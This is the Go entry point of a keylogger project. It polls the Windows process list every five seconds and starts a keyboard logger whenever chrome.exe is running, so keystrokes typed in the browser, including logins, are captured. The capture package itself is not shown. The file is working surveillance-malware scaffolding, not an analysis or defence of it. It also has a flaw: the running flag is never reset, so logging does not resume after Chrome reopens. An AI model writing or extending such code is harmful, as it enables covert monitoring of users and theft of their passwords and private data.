package main

import (
	"fmt"
	"keylogger/pkg/keyboardlogger"
	"keylogger/pkg/winprocessutils"
	"log"
	"time"
)

func main() {
	var loggerRunning bool = false

	for {
		procs, err := winprocessutils.Processes()
		if err != nil {
			log.Fatal(err)
		}
		chrome := winprocessutils.FindProcessByName(procs, "chrome.exe")
		if chrome != nil {
			// found it
			if !loggerRunning {
				loggerRunning = true
				go keyboardlogger.StartKeyboardLogger()
			}
			fmt.Println("Chrome is open!")
		} else {
			if loggerRunning {
				keyboardlogger.StopKeyboardLogger()
			}
		}
		time.Sleep(5 * time.Second)
		fmt.Printf("hey its been five seconds")
	}

}
